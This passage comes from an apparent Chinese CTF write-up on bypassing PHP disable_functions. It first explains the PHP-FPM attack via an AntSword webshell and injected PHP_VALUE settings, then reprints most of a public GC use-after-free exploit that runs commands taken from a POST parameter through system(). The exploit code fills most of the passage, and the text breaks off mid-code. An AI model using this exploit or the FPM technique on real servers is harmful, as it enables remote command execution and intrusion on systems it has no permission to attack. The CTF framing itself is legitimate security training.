src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/PHP-FPM/1.png" alt=""></p><p>连接蚁剑，使用插件模式选择Fastcgi/PHP-FPM</p><p>注意该模式下需要选择 PHP-FPM 的接口地址, 需要自行找配置文件查 FPM 接口地址, 默认的是 <code>unix:///</code> 本地 socket 这种的,如果配置成 TCP 的默认是 <code>127.0.0.1:9000</code></p><p>本例中, FPM 运行在 <code>127.0.0.1:9000</code> 端口</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/PHP-FPM/3.png" alt=""></p><p>会发现自动生成了<code>.antproxy.php</code>文件用蚁剑连，密码还是ant</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/PHP-FPM/6.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/PHP-FPM/4.png" alt=""></p><p>然后再终端看就能获取flag了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/PHP-FPM/5.png" alt=""></p><h6 id="一些疑问和解答">一些疑问和解答</h6><blockquote><p>这里由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.<br>因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信<br>但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：<br>1.第一个问题<br>既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.<br>2.第二个问题<br>我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.<br>那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_file<br>auto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.<br>3.第三个问题<br>进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?<br>这里,FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了</p></blockquote><p><a href="https://juejin.cn/post/6844903471976546311">Nginx+Php-fpm 运行原理详解 - 掘金 (juejin.cn)</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌 (leavesongs.com)</a></p><p><a href="https://github.com/adoy/PHP-FastCGI-Client">adoy/PHP-FastCGI-Client: Lightweight, single file, FastCGI client for PHP (github.com)</a></p><p><a href="https://gist.github.com/wofeiwo/4f41381a388accbf91f8">Jail break for PHP 5.3.3+ FASTCGI (github.com)</a></p><p><a href="https://www.anquanke.com/post/id/193117">利用Thinkphp RCE以及php-fpm绕过disable function拿下菠菜-安全客 - 安全资讯平台 (anquanke.com)</a></p><h5 id="5-GC-UAF">5.GC UAF</h5><blockquote><p>理论上PHP本地代码执行漏洞都可以用来 Bypass disable_function, 比如 GC UAF</p></blockquote><p>题目附件：<a href="https://bugs.php.net/bug.php?id=72530">PHP :: Bug #72530 :: Use After Free in GC with Certain Destructors</a></p><p>关于uaf的利用因为涉及到二进制相关的知识，笔者暂时只会用exp打打，因此这里就不多说，就暂时先稍微提一下三种uaf的利用版本及其概述，读者可以看exp作者的说明就行了</p><p>👉<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7">官方题解</a></p><p>利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3</p><h6 id="1-手工">1.手工</h6><p>exp地址</p><p><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">exploits/php7-gc-bypass at master · mm0r1/exploits (github.com)</a></p><p>上传exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span 